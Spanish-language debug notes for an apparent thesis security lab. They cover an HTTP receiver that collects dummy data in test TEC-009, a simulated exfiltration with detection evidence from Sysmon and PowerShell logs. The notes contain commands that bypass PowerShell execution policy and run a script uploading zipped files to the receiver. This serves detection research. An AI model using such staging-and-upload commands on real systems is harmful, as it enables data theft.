# TEC-009 receiver v4 debug notes

## Alcance

Depuracion acotada al receptor HTTP local usado por TEC-009. No modifica artifacts, router, Discord, CU_ID ni MITRE_ID. La transferencia es controlada y solo debe usarse con datos dummy del laboratorio.

## Diagnostico probable

El puerto 8000 acepta TCP desde la VM, pero `curl.exe` recibe `Recv failure: Connection was reset` antes de obtener una respuesta HTTP estable. Como `Test-NetConnection` es correcto y el mismo receptor responde desde el host, el problema no apunta al script TEC-009 ni a staging/ZIP/SHA256. El fallo queda en la frontera receptor/interfaz/stack HTTP: respuesta incompleta, cierre no controlado, timeout/reset durante lectura o escritura, o bloqueo/reset intermedio de Windows/VirtualBox antes de que el handler registre la peticion.

`receiver_tfm_v3.py` ya enviaba `Content-Length` y `Connection: close`, pero no dejaba log de proceso si se arrancaba oculto y no forzaba de forma explicita `HTTP/1.1`, `close_connection`, timeouts por socket ni captura separada de errores de transporte. `receiver_tfm_v4.py` endurece esos puntos para diferenciar fallo de aplicacion frente a fallo externo.

## Cambios en v4

- GET `/health` con HTTP 200, `Content-Type`, `Content-Length`, `Connection: close` y flush.
- POST `/upload` y PUT `/upload` con lectura exacta de `Content-Length`.
- Respuestas JSON estables con longitud fija.
- `protocol_version = "HTTP/1.1"` y `close_connection = True`.
- `ThreadingHTTPServer` con `allow_reuse_address` y threads daemon.
- Timeout por socket para evitar conexiones colgadas.
- Soporte basico de `Expect: 100-continue`.
- Guardado del body recibido sin ejecutar ni descomprimir contenido.
- JSONL con `timestamp`, `client_ip`, `method`, `path`, `bytes_received`, `saved_file`, `sha256`, `user_agent` y `content_type`.
- Registro JSONL de excepciones de transporte y de arranque/parada.
- Wrapper `Start-TFMReceiver_v4.ps1` con stdout/stderr redirigido a ficheros de proceso separados.

## Arranque recomendado en host

Desde `C:\Users\julio\Desktop\TFM\scripts_candidate`:

```powershell
.\Start-TFMReceiver_v4.ps1 -HostAddress "0.0.0.0" -Port 8000 -OutputDir ".\received" -MaxSeconds 600 -MaxUploads 5
```

Arranque directo equivalente:

```powershell
python .\receiver_tfm_v4.py --host 0.0.0.0 --port 8000 --out-dir ".\received" --log-file ".\received\receiver_log.jsonl" --max-seconds 600 --max-uploads 5
```

Si se quiere aislar solo la interfaz host-only:

```powershell
python .\receiver_tfm_v4.py --host 192.168.56.1 --port 8000 --out-dir ".\received" --log-file ".\received\receiver_log.jsonl" --max-seconds 600 --max-uploads 5
```

## Pruebas desde host

```powershell
Invoke-WebRequest "http://127.0.0.1:8000/health" -UseBasicParsing
Invoke-WebRequest "http://192.168.56.1:8000/health" -UseBasicParsing
```

## Pruebas desde VM

```powershell
curl.exe -v http://192.168.56.1:8000/health
```

```powershell
"tfm upload test" | Set-Content -LiteralPath "C:\Users\seguridad\Desktop\TFM\test_upload.txt" -Encoding ASCII
curl.exe -v --data-binary "@C:\Users\seguridad\Desktop\TFM\test_upload.txt" http://192.168.56.1:8000/upload
```

## Ejecucion TEC-009 desde VM

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
cd C:\Users\seguridad\Desktop\TFM\Pruebas\TEC-009_Exfiltracion
.\exfiltracion_v3.ps1 -ReceiverUrl "http://192.168.56.1:8000/upload" -EnableUpload $true -TimeoutSec 60 -KeepArtifacts $true
```

## Comprobacion de ZIP recibido y SHA256

En host:

```powershell
Get-ChildItem ".\received" -File | Sort-Object LastWriteTime -Descending | Select-Object FullName,Length,LastWriteTime
Get-Content ".\received\receiver_log.jsonl" -Tail 10
```

Para comparar hashes, usar el `sha256` registrado en `receiver_log.jsonl` y el `LocalSHA256` de:

```powershell
Get-Content "C:\Users\seguridad\Desktop\TFM\Pruebas\TEC-009_Exfiltracion\staging_controlled\tec009_transfer_summary.json" -Raw
```

Tambien puede calcularse en host:

```powershell
Get-FileHash ".\received\<archivo_recibido>.zip" -Algorithm SHA256
```

## Evidencia util posterior

- PowerShell 4104: `Compress-Archive`, `Copy-Item`, `Invoke-WebRequest`, `ReceiverUrl`, `ContentType application/zip`.
- Sysmon ID 1: ejecucion de `powershell.exe` con el script TEC-009 y parametros de upload.
- Sysmon ID 11: creacion local del ZIP y de la copia local si aparece en la ventana temporal.
- Sysmon ID 3: conexion desde la VM hacia `192.168.56.1:8000`.
- Sysmon ID 22: resolucion DNS solo si el flujo usado incluye nombres DNS; para `192.168.56.1` no debe esperarse DNS.
- JSONL del receptor: prueba de transferencia dummy, bytes recibidos, ruta guardada y SHA256.

Interpretacion metodologica: esto permite hablar de staging y archivado con transferencia HTTP controlada de datos dummy. No demuestra exfiltracion real de datos sensibles.
